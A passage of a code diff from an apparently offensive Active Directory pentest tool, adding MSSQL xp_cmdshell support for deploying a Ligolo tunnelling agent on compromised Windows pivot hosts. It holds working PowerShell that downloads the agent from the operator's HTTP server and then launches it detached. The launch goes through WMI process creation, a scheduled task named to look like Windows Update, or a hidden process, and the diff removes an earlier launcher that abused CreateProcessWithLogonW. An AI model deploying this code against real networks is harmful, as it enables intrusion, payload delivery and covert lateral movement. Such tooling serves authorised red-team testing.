@@ -42,6 +42,11 @@ from adscan_internal.services.ligolo_artifact_cleanup_service import (
     cleanup_remote_ligolo_artifact,
     confirm_ligolo_artifact_deployment,
 )
+from adscan_internal.services.http_transfer_service import (
+    DEFAULT_HTTP_STAGING_BIND_CANDIDATES,
+    HttpStagedFile,
+    SingleFileHttpTransferService,
+)
 from adscan_internal.services.ligolo_service import LigoloProxyService
 from adscan_internal.services.pivot_runtime_state_service import (
     reconcile_domain_pivot_runtime_state,
@@ -56,6 +61,41 @@ class PivotReachableSubnetSummary:
     hostnames: list[str]
     ips: list[str]
     reachable_ports: list[int]
+
+
+def _normalize_mssql_json_stdout(stdout: str) -> str:
+    """Normalize MSSQL stdout by dropping wrapper noise like ``NULL`` rows."""
+
+    normalized_lines = [
+        line.rstrip()
+        for line in str(stdout or "").splitlines()
+        if line.strip() and line.strip().upper() != "NULL"
+    ]
+    return "\n".join(normalized_lines).strip()
+
+
+def _load_remote_json_stdout(stdout: str, *, mssql_compatible: bool = False) -> Any:
+    """Decode JSON stdout, tolerating MSSQL row splitting when requested."""
+
+    normalized = (
+        _normalize_mssql_json_stdout(stdout) if mssql_compatible else str(stdout or "").strip()
+    )
+    if not normalized:
+        return {}
+    if not mssql_compatible:
+        return json.loads(normalized)
+    lines = normalized.splitlines()
+    for candidate in reversed(lines):
+        stripped = candidate.strip()
+        if stripped.startswith("{") or stripped.startswith("["):
+            try:
+                return json.loads(stripped)
+            except json.JSONDecodeError:
+                break
+    concatenated = "".join(line.rstrip() for line in lines)
+    if concatenated.startswith("{") or concatenated.startswith("["):
+        return json.loads(concatenated)
+    return json.loads(normalized)
 
 
 def summarize_confirmed_pivot_subnets(
@@ -128,31 +168,311 @@ def _resolve_ligolo_connect_host(shell: Any, *, listen_addr: str) -> str:
     )
 
 
+def _is_default_http_staging_port_conflict(error: Exception) -> bool:
+    """Return whether one exception represents the default HTTP staging port path."""
+
+    return "No default HTTP staging port is available" in str(error or "")
+
+
+def _prompt_http_staging_recovery_action() -> str:
+    """Prompt for the next action when HTTP staging ports are unavailable."""
+
+    return str(
+        Prompt.ask(
+            "HTTP staging recovery action",
+            choices=["retry", "custom", "skip"],
+            default="retry",
+        )
+        or "retry"
+    ).strip().lower()
+
+
+def _resolve_http_staging_bind_addr_with_recovery(
+    *,
+    pivot_host: str,
+    excluded_bind_addrs: list[str] | None = None,
+) -> str | None:
+    """Resolve one HTTP staging bind address and recover from local port conflicts."""
+
+    excluded = [str(item).strip() for item in (excluded_bind_addrs or []) if str(item).strip()]
+    while True:
+        try:
+            return SingleFileHttpTransferService.resolve_default_bind_addr(
+                candidates=DEFAULT_HTTP_STAGING_BIND_CANDIDATES,
+                excluded_bind_addrs=excluded,
+            )
+        except Exception as exc:  # noqa: BLE001
+            if not _is_default_http_staging_port_conflict(exc):
+                raise
+            print_warning(
+                f"HTTP staging ports are unavailable for {mark_sensitive(pivot_host, 'hostname')}: "
+                f"{rich_escape(str(exc))}"
+            )
+            if excluded:
+                print_instruction(
+                    "ADscan excluded local listeners already in use by the current workflow, for example the Ligolo proxy."
+                )
+            print_instruction("Free one local HTTP port and choose 'retry' to continue here.")
+            print_instruction(
+                "If the pivot can only egress to another port by design, choose 'custom' and provide it explicitly."
+            )
+            action = _prompt_http_staging_recovery_action()
+            if action == "skip":
+                print_info("Skipping HTTP staging for now.")
+                return None
+            if action == "retry":
+                print_info("Retrying HTTP staging port selection.")
+                continue
+            while True:
+                custom_addr = str(
+                    Prompt.ask(
+                        "Enter the HTTP staging bind address",
+                        default="0.0.0.0:8443",
+                    )
+                    or ""
+                ).strip()
+                try:
+                    parse_host_port(custom_addr)
+                except Exception:
+                    print_warning("Invalid bind address format. Use host:port, for example 0.0.0.0:8443.")
+                    continue
+                if custom_addr in excluded:
+                    print_warning(
+                        f"Custom HTTP staging address {mark_sensitive(custom_addr, 'host')} "
+                        "conflicts with an existing excluded listener."
+                    )
+                    continue
+                if not is_tcp_bind_address_available(custom_addr):
+                    print_warning(
+                        f"Custom HTTP staging address {mark_sensitive(custom_addr, 'host')} is still busy."
+                    )
+                    continue
+                print_info(
+                    f"Using custom HTTP staging address {mark_sensitive(custom_addr, 'host')} by operator choice."
+                )
+                return custom_addr
+
+
+def _build_windows_transport_preflight_script(
+    *,
+    proxy_host: str,
+    proxy_port: int,
+    http_host: str,
+    http_port: int,
+) -> str:
+    """Build one PowerShell script that probes both proxy and HTTP staging reachability."""
+
+    return (
+        "function Test-AdscanTcpReachability {\n"
+        "    param(\n"
+        "        [string]$TargetHost,\n"
+        "        [int]$TargetPort\n"
+        "    )\n"
+        "    $reachable = $false\n"
+        "    $client = New-Object System.Net.Sockets.TcpClient\n"
+        "    try {\n"
+        "        $iar = $client.BeginConnect($TargetHost, $TargetPort, $null, $null)\n"
+        "        if ($iar.AsyncWaitHandle.WaitOne(3000, $false)) {\n"
+        "            $client.EndConnect($iar) | Out-Null\n"
+        "            $reachable = $true\n"
+        "        }\n"
+        "    } catch {\n"
+        "    } finally {\n"
+        "        $client.Close()\n"
+        "    }\n"
+        "    return [PSCustomObject]@{ host = $TargetHost; port = $TargetPort; reachable = $reachable }\n"
+        "}\n"
+        f"$proxyCheck = Test-AdscanTcpReachability -TargetHost '{proxy_host}' -TargetPort {proxy_port}\n"
+        f"$httpCheck = Test-AdscanTcpReachability -TargetHost '{http_host}' -TargetPort {http_port}\n"
+        "[PSCustomObject]@{\n"
+        "    proxy = $proxyCheck\n"
+        "    http = $httpCheck\n"
+        "} | ConvertTo-Json -Depth 4 -Compress\n"
+    )
+
+
+def _build_windows_http_download_script(
+    *,
+    source_url: str,
+    remote_path: str,
+) -> str:
+    """Build one Windows PowerShell script that downloads one artifact over HTTP."""
+
+    return (
+        f"$sourceUrl = '{source_url}'\n"
+        f"$destinationPath = '{remote_path}'\n"
+        "$downloaded = $false\n"
+        "$downloadMethod = ''\n"
+        "$errors = @()\n"
+        "$ProgressPreference = 'SilentlyContinue'\n"
+        "try {\n"
+        "    Invoke-WebRequest -Uri $sourceUrl -OutFile $destinationPath -UseBasicParsing\n"
+        "    if (Test-Path -LiteralPath $destinationPath) {\n"
+        "        $downloaded = $true\n"
+        "        $downloadMethod = 'invoke-webrequest'\n"
+        "    }\n"
+        "} catch {\n"
+        "    $errors += ('Invoke-WebRequest: ' + $_.Exception.Message)\n"
+        "}\n"
+        "if (-not $downloaded) {\n"
+        "    try {\n"
+        "        $client = New-Object System.Net.WebClient\n"
+        "        $client.DownloadFile($sourceUrl, $destinationPath)\n"
+        "        if (Test-Path -LiteralPath $destinationPath) {\n"
+        "            $downloaded = $true\n"
+        "            $downloadMethod = 'webclient'\n"
+        "        }\n"
+        "    } catch {\n"
+        "        $errors += ('WebClient: ' + $_.Exception.Message)\n"
+        "    } finally {\n"
+        "        if ($client) { $client.Dispose() }\n"
+        "    }\n"
+        "}\n"
+        "if (-not $downloaded) {\n"
+        "    try {\n"
+        "        $curlCommand = Get-Command curl.exe -ErrorAction SilentlyContinue\n"
+        "        if (-not $curlCommand) { throw 'curl.exe not available' }\n"
+        "        & $curlCommand.Source '-fsSL' '-o' $destinationPath $sourceUrl\n"
+        "        if ($LASTEXITCODE -ne 0) { throw ('curl exit code ' + $LASTEXITCODE) }\n"
+        "        if (Test-Path -LiteralPath $destinationPath) {\n"
+        "            $downloaded = $true\n"
+        "            $downloadMethod = 'curl'\n"
+        "        }\n"
+        "    } catch {\n"
+        "        $errors += ('curl.exe: ' + $_.Exception.Message)\n"
+        "    }\n"
+        "}\n"
+        "$size = 0\n"
+        "if (Test-Path -LiteralPath $destinationPath) {\n"
+        "    $size = (Get-Item -LiteralPath $destinationPath).Length\n"
+        "}\n"
+        "[PSCustomObject]@{\n"
+        "    downloaded = $downloaded\n"
+        "    method = $downloadMethod\n"
+        "    destination = $destinationPath\n"
+        "    size = $size\n"
+        "    errors = @($errors)\n"
+        "} | ConvertTo-Json -Depth 4 -Compress\n"
+    )
+
+
+def _download_remote_artifact_via_http(
+    *,
+    execute_remote_script: Callable[..., str],
+    domain: str,
+    pivot_host: str,
+    username: str,
+    password: str,
+    staging_file: HttpStagedFile,
+    remote_path: str,
+) -> bool:
+    """Download one local artifact to the remote pivot host over HTTP."""
+
+    download_raw = execute_remote_script(
+        domain=domain,
+        host=pivot_host,
+        username=username,
+        password=password,
+        script=_build_windows_http_download_script(
+            source_url=staging_file.url,
+            remote_path=remote_path,
+        ),
+        operation_name="ligolo_http_stage_download",
+    )
+    download_payload = json.loads(str(download_raw or "").strip() or "{}")
+    downloaded = bool(download_payload.get("downloaded"))
+    size_value = int(download_payload.get("size") or 0)
+    if downloaded and size_value >= staging_file.file_size:
+        print_info_debug(
+            "[pivot] HTTP artifact staging succeeded "
+            f"method={mark_sensitive(str(download_payload.get('method') or 'unknown'), 'text')} "
+            f"size={size_value} "
+            f"remote_path={mark_sensitive(remote_path, 'path')}"
+        )
+        return True
+
+    errors = ", ".join(str(item).strip() for item in download_payload.get("errors", []) if str(item).strip())
+    print_warning(
+        f"HTTP artifact staging to {mark_sensitive(pivot_host, 'hostname')} failed. "
+        "ADscan will fall back to the legacy artifact upload path.",
+        items=[
+            f"URL: {mark_sensitive(staging_file.url, 'url')}",
+            f"Reported size: {size_value}",
+            errors or "No remote download errors were returned.",
+        ],
+        panel=True,
+    )
+    return False
+
+
+def _run_ligolo_transport_preflight(
+    *,
+    execute_remote_script: Callable[..., str],
+    domain: str,
+    pivot_host: str,
+    username: str,
+    password: str,
+    connect_target: str,
+    staging_file: HttpStagedFile,
+) -> dict[str, Any]:
+    """Probe both the Ligolo proxy and the HTTP staging endpoint in one remote execution."""
+
+    proxy_host, _separator, proxy_port_text = str(connect_target or "").rpartition(":")
+    _http_host, _separator, http_port_text = str(staging_file.bind_addr or "").rpartition(":")
+    return json.loads(
+        str(
+            execute_remote_script(
+                domain=domain,
+                host=pivot_host,
+                username=username,
+                password=password,
+                script=_build_windows_transport_preflight_script(
+                    proxy_host=proxy_host,
+                    proxy_port=int(proxy_port_text),
+                    http_host=staging_file.advertised_host,
+                    http_port=int(http_port_text),
+                ),
+                operation_name="ligolo_transport_preflight",
+            )
+            or ""
+        ).strip()
+        or "{}"
+    )
+
+
 def build_ligolo_agent_start_script(
     *,
     remote_agent_path: str,
     connect_target: str,
     fingerprint: str,
-    winrm_username: str = "",
-    winrm_domain: str = "",
-    winrm_password: str = "",
 ) -> str:
-    """Return one PowerShell script that starts the Ligolo agent in the background."""
+    """Return one PowerShell script that starts the Ligolo agent in the background.
 
+    This script is used for non-WinRM transports (e.g. MSSQL xp_cmdshell) where a
+    keepalive session is not available.  The process must survive after the calling
+    PowerShell session terminates.
+
+    Launch strategy (tried in order):
+      1. WMI Win32_Process.Create — the WMI provider host (WmiPrvSE.exe) creates the
+         new process, making it a child of WmiPrvSE rather than of the calling
+         PowerShell/cmd.exe/sqlservr chain.  Because WmiPrvSE is outside the SQL
+         Server process tree the agent survives xp_cmdshell session teardown with no
+         credentials or elevated rights required.
+      2. Scheduled task — fully independent via the Task Scheduler service; survives
+         any session close but typically requires local admin or delegated CIM/WMI
+         rights to register tasks.
+      3. Start-Process — last resort; creates a direct child of PowerShell and may be
+         killed if the caller's process tree is torn down, but works in interactive
+         sessions and some constrained environments.
+    """
     escaped_path = str(remote_agent_path).replace("'", "''")
     escaped_target = str(connect_target).replace("'", "''")
     escaped_fingerprint = str(fingerprint).replace("'", "''")
-    escaped_username = str(winrm_username).replace("'", "''")
-    escaped_domain = str(winrm_domain).replace("'", "''")
-    escaped_password = str(winrm_password).replace("'", "''")
     return rf"""
 $ErrorActionPreference = 'Stop'
 $agentPath = '{escaped_path}'
 $connectTarget = '{escaped_target}'
 $fingerprint = '{escaped_fingerprint}'
-$winrmUser = '{escaped_username}'
-$winrmDomain = '{escaped_domain}'
-$winrmPass = '{escaped_password}'
 if (-not (Test-Path -LiteralPath $agentPath)) {{
     throw "Ligolo agent binary not found at $agentPath"
 }}
@@ -172,72 +492,45 @@ try {{
 if (-not $reachable) {{
     throw "Ligolo proxy at $connectTarget is not reachable from this host (TCP probe failed)"
 }}
-# Non-interactive WinRM sessions run inside a Windows Job Object with
-# KILL_ON_JOB_CLOSE.  When the script returns and the session closes, the Job
-# kills all child processes.
-#
-# Launch strategy (tried in order):
-#   1. CreateProcessWithLogonW (advapi32) — delegates process creation to the
-#      Secondary Logon service (seclogon.exe) which runs OUTSIDE the WinRM Job.
-#      The new process becomes a child of seclogon, not of PowerShell, so it
-#      survives session teardown without requiring elevated rights.  Only needs
-#      the account to have "Allow log on locally" and the Seclogon service running
-#      (started on demand by Windows automatically).
-#   2. Scheduled task — fully independent via Task Scheduler service; typically
-#      requires local admin or delegated CIM/WMI rights.
-#   3. Start-Process — last resort; will be killed on session close in
-#      non-interactive WinRM but covers interactive shell edge cases.
 $agentArgs = "-connect $connectTarget -accept-fingerprint $fingerprint -retry -retry-delay 5 -reconnect-timeout 60"
 $agentExeName = [System.IO.Path]::GetFileNameWithoutExtension($agentPath)
-$launchMethod = 'logon-w'
+$launchMethod = 'wmi'
 $procId = $null
+$wmiError = $null
+$schtaskError = $null
 
+# 1. WMI Win32_Process.Create — spawns via WmiPrvSE.exe, fully outside the calling
+#    process tree (and therefore outside the SQL Server process tree when invoked via
+#    xp_cmdshell).  No credentials required; works under the SQL service account.
 try {{
-    Add-Type -Language CSharp -TypeDefinition @'
-using System;
-using System.Runtime.InteropServices;
-public class WinProcLauncherLogonW {{
-    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
-    public static extern bool CreateProcessWithLogonW(
-        string user, string domain, string pass, uint logonFlags,
-        string app, string cmd, uint flags, IntPtr env, string dir,
-        ref STARTUPINFO si, out PROCINFO pi);
-    [StructLayout(LayoutKind.Sequential)]
-    public struct STARTUPINFO {{
-        public int cb, r1; public IntPtr desk, title;
-        public int x, y, xs, ys, xc, yc, fill, fl; public short sw, r2;
-        public IntPtr r3, hin, hout, herr;
+    $wmiArgs = @{{
+        CommandLine      = "`"$agentPath`" $agentArgs"
+        CurrentDirectory = 'C:\Windows\Temp'
     }}
-    [StructLayout(LayoutKind.Sequential)]
-    public struct PROCINFO {{ public IntPtr hp, ht; public int pid, tid; }}
-    public static int Spawn(string user, string domain, string pass, string cmd) {{
-        var si = new STARTUPINFO(); si.cb = Marshal.SizeOf(si);
-        PROCINFO pi;
-        const uint LOGON_WITH_PROFILE = 1u, CREATE_NO_WINDOW = 0x08000000u;
-        return CreateProcessWithLogonW(user, domain, pass, LOGON_WITH_PROFILE,
-            null, cmd, CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi)
-            ? pi.pid : -Marshal.GetLastWin32Error();
+    $wmiResult = Invoke-CimMethod -ClassName Win32_Process -Namespace 'root/cimv2' `
+        -MethodName Create -Arguments $wmiArgs -ErrorAction Stop
+    if ($wmiResult.ReturnValue -eq 0) {{
+        $procId = $wmiResult.ProcessId
+    }} else {{
+        throw "Win32_Process.Create returned error code $($wmiResult.ReturnValue)"
     }}
-}}
-'@ -ErrorAction Stop
-    $r = [WinProcLauncherLogonW]::Spawn($winrmUser, $winrmDomain, $winrmPass, "`"$agentPath`" $agentArgs")
-    if ($r -le 0) {{ throw "CreateProcessWithLogonW failed (Win32 error=$(-$r))" }}
-    $procId = $r
 }} catch {{
-    # CreateProcessWithLogonW failed — try scheduled task
+    $wmiError = $_.Exception.Message
+    # WMI unavailable or insufficient rights — try scheduled task
     $launchMethod = 'schtask'
     try {{
         $taskName = "WU_$(Get-Random -Minimum 10000 -Maximum 99999)"
-        $action = New-ScheduledTaskAction -Execute $agentPath -Argument $agentArgs
-        $trigger = New-ScheduledTaskTrigger -Once -At '2099-01-01 00:00:00'
+        $action   = New-ScheduledTaskAction -Execute $agentPath -Argument $agentArgs
+        $trigger  = New-ScheduledTaskTrigger -Once -At '2099-01-01 00:00:00'
         $null = Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force -ErrorAction Stop
         $null = Start-ScheduledTask -TaskName $taskName -ErrorAction Stop
         Start-Sleep -Seconds 3
-        $proc = Get-Process -Name $agentExeName -ErrorAction SilentlyContinue | Select-Object -First 1
+        $proc   = Get-Process -Name $agentExeName -ErrorAction SilentlyContinue | Select-Object -First 1
         $procId = if ($proc) {{ $proc.Id }} else {{ $null }}
         $null = Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
     }} catch {{
-        # Last resort: Start-Process (process may be killed on session close)
+        $schtaskError = $_.Exception.Message
+        # Last resort: Start-Process (process may be killed if process tree is torn down)
         $launchMethod = 'start-process'
         $pargs = @('-connect', $connectTarget, '-accept-fingerprint', $fingerprint, '-retry', '-retry-delay', '5', '-reconnect-timeout', '60')
         $sp = Start-Process -FilePath $agentPath -ArgumentList $pargs -WindowStyle Hidden -PassThru
@@ -248,15 +541,16 @@ public class WinProcLauncherLogonW {{
 }}
 
 $processAlive = $null -ne $procId
-$exitCode = $null
 [PSCustomObject]@{{
-    started = $true
-    pid = $procId
-    command = "$agentPath $agentArgs"
+    started         = $true
+    pid             = $procId
+    command         = "$agentPath $agentArgs"
     probe_reachable = $true
-    process_alive = $processAlive
-    exit_code = $exitCode
-    launch_method = $launchMethod
+    process_alive   = $processAlive
+    exit_code       = $null
+    launch_method   = $launchMethod
+    wmi_error       = $wmiError
+    schtask_error   = $schtaskError
 }} | ConvertTo-Json -Depth 4 -Compress
 """
 
@@ -410,6 +704,12 @@ def _is_default_ligolo_port_conflict(error: Exception) -> bool:
     return "No default ligolo egress port is available" in str(error or "")
 
 
+def _is_default_ligolo_api_port_conflict(error: Exception) -> bool:
+    """Return whether one exception represents the default Ligolo API port path."""
+
+    return "No default Ligolo API port is available" in str(error or "")
+
+
 def _prompt_ligolo_listen_recovery_action() -> str:
     """Prompt for the next action when Ligolo default egress ports are unavailable."""
 
@@ -473,6 +773,84 @@ def _resolve_ligolo_listen_addr_with_recovery(
                 return custom_addr
 
 
+def _prompt_ligolo_api_recovery_action() -> str:
+    """Prompt for the next action when Ligolo API ports are unavailable."""
+
+    return str(
+        Prompt.ask(
+            "Ligolo API recovery action",
+            choices=["retry", "custom", "skip"],
+            default="retry",
+        )
+        or "retry"
+    ).strip().lower()
+
+
+def _resolve_ligolo_api_laddr_with_recovery(
+    service: LigoloProxyService,
+    *,
+    pivot_host: str,
+    excluded_bind_addrs: list[str] | None = None,
+) -> str | None:
+    """Resolve one local Ligolo API bind address and recover from port conflicts."""
+
+    excluded = [str(item).strip() for item in (excluded_bind_addrs or []) if str(item).strip()]
+    while True:
+        try:
+            return service.resolve_default_api_laddr(excluded_bind_addrs=excluded)
+        except Exception as exc:  # noqa: BLE001
+            if not _is_default_ligolo_api_port_conflict(exc):
+                raise
+            print_warning(
+                f"Ligolo API ports are unavailable for {mark_sensitive(pivot_host, 'hostname')}: "
+                f"{rich_escape(str(exc))}"
+            )
+            print_instruction("Free one local loopback API port and choose 'retry' to continue here.")
+            print_instruction(
+                "If you need another local API port by design, choose 'custom' and provide it explicitly."
+            )
+            action = _prompt_ligolo_api_recovery_action()
+            if action == "skip":
+                print_info("Skipping Ligolo tunnel creation for now.")
+                return None
+            if action == "retry":
+                print_info("Retrying Ligolo API port selection.")
+                continue
+            while True:
+                custom_addr = str(
+                    Prompt.ask(
+                        "Enter the Ligolo API bind address",
+                        default="127.0.0.1:11611",
+                    )
+                    or ""
+                ).strip()
+                try:
+                    host, _port = parse_host_port(custom_addr)
+                except Exception:
+                    print_warning(
+                        "Invalid API bind address format. Use host:port, for example 127.0.0.1:11611."
+                    )
+                    continue
+                if host not in {"127.0.0.1", "localhost"}:
+                    print_warning("Ligolo API bind address must stay on loopback, for example 127.0.0.1:11611.")
+                    continue
+                if custom_addr in excluded:
+                    print_warning(
+                        f"Custom Ligolo API address {mark_sensitive(custom_addr, 'host')} "
+                        "conflicts with an existing excluded listener."
+                    )
+                    continue
+                if not is_tcp_bind_address_available(custom_addr):
+                    print_warning(
+                        f"Custom Ligolo API address {mark_sensitive(custom_addr, 'host')} is still busy."
+                    )
+                    continue
+                print_info(
+                    f"Using custom Ligolo API address {mark_sensitive(custom_addr, 'host')} by operator choice."
+                )
+                return custom_addr
+
+
 def _keepalive_exit_was_operator_requested(
     service: LigoloProxyService,
     *,
@@ -507,6 +885,8 @@ def orchestrate_ligolo_pivot_tunnel(
     upload_agent: Callable[..., bool],
     execute_remote_script: Callable[..., str],
     remote_agent_os: str = "windows",
+    source_service: str = "winrm",
+    pivot_method: str = "ligolo_winrm_pivot",
 ) -> bool:
     """Create one Ligolo tunnel for confirmed pivot subnets and verify the routes."""
 
@@ -551,19 +931,25 @@ def orchestrate_ligolo_pivot_tunnel(
             )
             if not listen_addr:
                 return
+            api_laddr = _resolve_ligolo_api_laddr_with_recovery(
+                service,
+                pivot_host=pivot_host,
+            )
+            if not api_laddr:
+                return
             print_operation_header(
                 "Ligolo Pivot Tunnel",
                 details={
                     "Domain": domain,
                     "Pivot Host": pivot_host,
                     "Listen": listen_addr,
-                    "API": proxy_state.get("api_laddr") or "127.0.0.1:8080",
+                    "API": api_laddr,
                     "Subnets": str(len(subnet_summaries)),
                     "Host Count": str(len(confirmed_targets)),
                 },
                 icon="🧭",
             )
-            proxy_state = service.start_proxy(listen_addr=listen_addr)
+            proxy_state = service.start_proxy(listen_addr=listen_addr, api_laddr=api_laddr)
         else:
             print_operation_header(
                 "Ligolo Pivot Tunnel",
@@ -618,95 +1004,220 @@ def orchestrate_ligolo_pivot_tunnel(
         ):
             print_info("Skipping Ligolo tunnel creation by user choice.")
             return False
-        if not upload_agent(
-            domain=domain,
-            host=pivot_host,
-            username=username,
-            password=password,
-            local_path=str(agent_path),
-            remote_path=remote_agent_path,
-        ):
-            raise RuntimeError(
-                f"Failed to upload the Ligolo agent to {remote_agent_path}."
+        artifact_transfer_method = "upload"
+        if str(source_service or "").strip().lower() == "mssql":
+            staging_bind_addr = _resolve_http_staging_bind_addr_with_recovery(
+                pivot_host=pivot_host,
+                excluded_bind_addrs=[str(proxy_state.get("listen_addr") or "").strip()],
             )
+            if staging_bind_addr:
+                staging_service = SingleFileHttpTransferService()
+                try:
+                    staged_file = staging_service.start(
+                        local_path=str(agent_path),
+                        bind_addr=staging_bind_addr,
+                        advertised_host=connect_host,
+                    )
+                    preflight_payload = _run_ligolo_transport_preflight(
+                        execute_remote_script=execute_remote_script,
+                        domain=domain,
+                        pivot_host=pivot_host,
+                        username=username,
+                        password=password,
+                        connect_target=connect_target,
+                        staging_file=staged_file,
+                    )
+                    proxy_check = preflight_payload.get("proxy") if isinstance(preflight_payload, dict) else {}
+                    http_check = preflight_payload.get("http") if isinstance(preflight_payload, dict) else {}
+                    proxy_reachable = bool(isinstance(proxy_check, dict) and proxy_check.get("reachable"))
+                    http_reachable = bool(isinstance(http_check, dict) and http_check.get("reachable"))
+                    if not proxy_reachable:
+                        raise RuntimeError(
+                            "The pivot host could not reach the Ligolo proxy preflight endpoint "
+                            f"{connect_target}. Check your myip/connect target and local firewall rules."
+                        )
+                    if http_reachable and _download_remote_artifact_via_http(
+                        execute_remote_script=execute_remote_script,
+                        domain=domain,
+                        pivot_host=pivot_host,
+                        username=username,
+                        password=password,
+                        staging_file=staged_file,
+                        remote_path=remote_agent_path,
+                    ):
+                        artifact_transfer_method = "http_download"
+                    else:
+                        if not http_reachable:
+                            _http_host_text, _separator, _http_port_text = str(staged_file.bind_addr or "").rpartition(":")
+                            print_warning(
+                                f"The pivot host {mark_sensitive(pivot_host, 'hostname')} could not reach the local HTTP staging endpoint "
+                                f"{mark_sensitive(staged_file.advertised_host, 'hostname')}:{_http_port_text}. "
+                                "ADscan will fall back to the legacy artifact upload path."
+                            )
+                        print_info(
+                            "Falling back to direct Ligolo artifact upload. "
+                            "This can be significantly slower over MSSQL."
+                        )
+                        if not upload_agent(
+                            domain=domain,
+                            host=pivot_host,
+                            username=username,
+                            password=password,
+                            local_path=str(agent_path),
+                            remote_path=remote_agent_path,
+                        ):
+                            raise RuntimeError(
+                                f"Failed to upload the Ligolo agent to {remote_agent_path}."
+                            )
+                finally:
+                    staging_service.stop()
+            else:
+                print_info(
+                    "HTTP staging was skipped by operator choice. "
+                    "Falling back to direct Ligolo artifact upload."
+                )
+                if not upload_agent(
+                    domain=domain,
+                    host=pivot_host,
+                    username=username,
+                    password=password,
+                    local_path=str(agent_path),
+                    remote_path=remote_agent_path,
+                ):
+                    raise RuntimeError(
+                        f"Failed to upload the Ligolo agent to {remote_agent_path}."
+                    )
+        else:
+            if not upload_agent(
+                domain=domain,
+                host=pivot_host,
+                username=username,
+                password=password,
+                local_path=str(agent_path),
+                remote_path=remote_agent_path,
+            ):
+                raise RuntimeError(
+                    f"Failed to upload the Ligolo agent to {remote_agent_path}."
+                )
 
         known_session_ids = {
             str(agent.get("session_id") or "").strip()
             for agent in service.list_agents()
             if str(agent.get("session_id") or "").strip()
         }
-        # Windows: launch the agent via a keepalive WinRM session.
-        #
-        # Non-interactive WinRM sessions put all child processes in a Job Object
-        # with KILL_ON_JOB_CLOSE.  When a script returns the session closes, the
-        # Job closes, and the agent is killed — before the tunnel can connect.
-        #
-        # Fix: run the agent launch + polling loop in a background Python thread
-        # that calls execute_remote_script and blocks for up to 1 hour.  The
-        # PSRP RunspacePool (and its wsmprovhost.exe Job Object) stays open for
-        # as long as that background thread is alive, keeping the agent process
-        # alive with it.  The keepalive script writes a result JSON to a temp
-        # file; the main thread polls for that file via a separate short-lived
-        # WinRM call, then proceeds with Ligolo API setup.
-        result_token = secrets.token_hex(8)
-        result_path = rf"C:\Windows\Temp\adscan_l{result_token}.json"
-        keepalive_script = build_ligolo_agent_keepalive_script(
-            remote_agent_path=remote_agent_path,
-            connect_target=connect_target,
-            fingerprint=fingerprint,
-            result_path=result_path,
-        )
+        keepalive_thread: threading.Thread | None = None
         keepalive_errors: list[Exception] = []
-
-        def _run_keepalive() -> None:
-            try:
-                execute_remote_script(
-                    domain=domain,
-                    host=pivot_host,
-                    username=username,
-                    password=password,
-                    script=keepalive_script,
-                    operation_name="ligolo_agent_keepalive",
-                )
-            except Exception as exc:  # noqa: BLE001
-                keepalive_errors.append(exc)
-
-        print_info_verbose("Launching Ligolo agent on target via keepalive WinRM session…")
-        keepalive_thread = threading.Thread(
-            target=_run_keepalive, daemon=True, name="ligolo-keepalive"
-        )
-        keepalive_thread.start()
-
-        # Poll for the result file written by the keepalive script (~3s after launch).
-        result_reader = _build_result_reader_script(result_path)
         launch_payload: dict[str, Any] = {}
-        poll_deadline = time.time() + 40.0
-        while time.time() < poll_deadline:
-            time.sleep(2.0)
-            if keepalive_errors:
-                raise RuntimeError(
-                    f"Ligolo agent keepalive failed before writing result: {keepalive_errors[0]}"
-                )
-            try:
-                read_stdout = execute_remote_script(
-                    domain=domain,
-                    host=pivot_host,
-                    username=username,
-                    password=password,
-                    script=result_reader,
-                    operation_name="ligolo_agent_result_read",
-                )
-                raw = (read_stdout or "{}").strip()
-                if raw and raw not in ("{}", ""):
-                    launch_payload = json.loads(raw)
-                    break
-            except Exception:  # noqa: BLE001
-                continue
+        uses_keepalive_session = str(source_service or "").strip().lower() == "winrm"
 
-        if not isinstance(launch_payload, dict) or not launch_payload.get("started"):
-            raise RuntimeError(
-                "Ligolo agent keepalive script did not return a successful result within 40s."
+        if uses_keepalive_session:
+            # WinRM needs a keepalive session because child processes inherit the
+            # WinRM Job Object and are killed once the non-interactive session exits.
+            result_token = secrets.token_hex(8)
+            result_path = rf"C:\Windows\Temp\adscan_l{result_token}.json"
+            keepalive_script = build_ligolo_agent_keepalive_script(
+                remote_agent_path=remote_agent_path,
+                connect_target=connect_target,
+                fingerprint=fingerprint,
+                result_path=result_path,
             )
+
+            def _run_keepalive() -> None:
+                try:
+                    execute_remote_script(
+                        domain=domain,
+                        host=pivot_host,
+                        username=username,
+                        password=password,
+                        script=keepalive_script,
+                        operation_name="ligolo_agent_keepalive",
+                    )
+                except Exception as exc:  # noqa: BLE001
+                    keepalive_errors.append(exc)
+
+            print_info_verbose("Launching Ligolo agent on target via keepalive WinRM session…")
+            keepalive_thread = threading.Thread(
+                target=_run_keepalive, daemon=True, name="ligolo-keepalive"
+            )
+            keepalive_thread.start()
+
+            result_reader = _build_result_reader_script(result_path)
+            poll_deadline = time.time() + 40.0
+            while time.time() < poll_deadline:
+                time.sleep(2.0)
+                if keepalive_errors:
+                    raise RuntimeError(
+                        f"Ligolo agent keepalive failed before writing result: {keepalive_errors[0]}"
+                    )
+                try:
+                    read_stdout = execute_remote_script(
+                        domain=domain,
+                        host=pivot_host,
+                        username=username,
+                        password=password,
+                        script=result_reader,
+                        operation_name="ligolo_agent_result_read",
+                    )
+                    raw = (read_stdout or "{}").strip()
+                    if raw and raw not in ("{}", ""):
+                        launch_payload = json.loads(raw)
+                        break
+                except Exception:  # noqa: BLE001
+                    continue
+
+            if not isinstance(launch_payload, dict) or not launch_payload.get("started"):
+                raise RuntimeError(
+                    "Ligolo agent keepalive script did not return a successful result within 40s."
+                )
+        else:
+            start_script = build_ligolo_agent_start_script(
+                remote_agent_path=remote_agent_path,
+                connect_target=connect_target,
+                fingerprint=fingerprint,
+            )
+            print_info_verbose(
+                f"Launching Ligolo agent on target via {mark_sensitive(source_service.upper(), 'detail')} command execution…"
+            )
+            launch_stdout = execute_remote_script(
+                domain=domain,
+                host=pivot_host,
+                username=username,
+                password=password,
+                script=start_script,
+                operation_name="ligolo_agent_start",
+            )
+            raw_launch = str(launch_stdout or "").strip()
+            print_info_debug(
+                f"[pivot] ligolo_agent_start raw stdout ({len(raw_launch)} chars): "
+                f"{raw_launch[:500]!r}"
+            )
+            try:
